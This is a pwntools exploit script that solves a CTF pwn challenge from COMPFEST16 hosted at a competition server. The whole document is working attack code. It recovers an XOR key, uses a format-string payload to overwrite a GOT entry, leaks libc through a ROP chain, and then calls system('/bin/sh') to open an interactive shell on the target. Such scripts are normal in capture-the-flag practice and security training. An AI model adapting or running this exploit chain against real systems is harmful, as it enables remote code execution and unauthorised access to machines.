from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challenges.ctf.compfest.id", 9006)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4013c9
b *0x4013ff
b *0x000000000040143d
b *0x0000000000401412
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# sl(b'%16$p')
ru(b'>')
sl(b'a'*8)
ru("Here is your XORed result : ")
buh = re(1)
xorrer = xor(b'a', buh)
ic(xorrer)

ret = 0x000000000040101a
pop_rdi = 0x00000000004014a3

payload = fmtstr_payload(8, {elf.got['__stack_chk_fail']: elf.plt['puts']}).ljust(0x58, b'a')
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(ret)
payload += p64(elf.sym['main'])
xorred = xor(payload, xorrer)
# ic(xorred)
sl(xorred)

ru("Thanks for joining COMPFEST16\n\n")
libc.address = u64(rl().rstrip().ljust(8, b'\x00')) - 0x84420
ic(hex(libc.address))

ru(b'>')
sl(b'a'*8)
ru("Here is your XORed result : ")
buh = re(1)
xorrer = xor(b'a', buh)
ic(xorrer)

binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym['system']

payload = b'a'*0x58
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
xorred = xor(payload, xorrer)
# ic(xorred)
sl(xorred)
io.interactive()
